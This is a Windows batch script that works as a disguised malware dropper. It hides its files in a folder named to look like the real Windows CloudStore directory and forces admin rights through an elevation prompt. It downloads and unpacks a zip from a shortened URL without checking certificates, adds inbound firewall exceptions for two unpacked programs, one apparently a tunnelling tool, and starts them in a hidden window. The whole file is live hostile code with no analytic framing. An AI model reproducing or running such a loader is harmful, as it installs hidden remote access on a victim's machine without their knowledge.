@echo off
cd "%appdata%\Microsoft\Windows"
md CloudStore
cd CloudStore
if not exist "%appdata%\Microsoft\Windows\CloudStore\start.cmd" goto inst
powershell "Start-Process 'cmd' -ArgumentList '/c start.cmd' -WindowStyle Hidden"
exit /b
:inst
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)
cd "%appdata%\Microsoft\Windows"
md CloudStore 
cd CloudStore
del /q /s cloudstore.zip
curl -L -k -o cloudstore.zip "https://cloudstore.short.gy/download"
if not exist cloudstore.zip exit /b
tar -xf cloudstore.zip && del /q /s cloudstore.zip
netsh advfirewall firewall add rule name="MeuPrograma" dir=in action=allow program="%appdata%\Microsoft\Windows\CloudStore\bore.exe" profile=any enable=yes
netsh advfirewall firewall add rule name="MeuPrograma" dir=in action=allow program="%appdata%\Microsoft\Windows\CloudStore\store.exe" profile=any enable=yes
powershell "Start-Process 'cmd' -ArgumentList '/c start.cmd' -WindowStyle Hidden"
exit /b